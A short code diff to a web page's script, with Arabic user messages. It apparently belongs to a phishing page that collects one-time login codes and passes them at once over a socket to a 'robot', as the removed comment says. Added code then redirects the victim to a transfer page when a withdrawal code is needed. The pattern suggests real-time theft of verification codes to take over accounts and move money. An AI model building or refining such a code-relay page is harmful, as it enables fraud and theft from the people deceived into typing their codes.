@@ -29,16 +29,16 @@
 
     function submitOTP() {
         const code = document.getElementById('otpCode').value;
-        if(code.length < 6) {
-            alert("يرجى إدخال الكود كاملاً");
-            return;
-        }
+        if(code.length < 6) return alert("كود ناقص");
         
-        // إرسال الكود للروبوت فوراً
-        socket.emit('send_otp', { code: code });
-        
-        alert("جاري التحقق.. يرجى الانتظار");
+        socket.emit('send_login_otp', { code: code });
+        document.getElementById('btnConfirm').innerText = "جاري التحقق...";
     }
+
+    socket.on('need_withdraw_otp', () => {
+        window.location.href = "transfer.html"; 
+    });
 </script>
+    
 </body>
 </html>
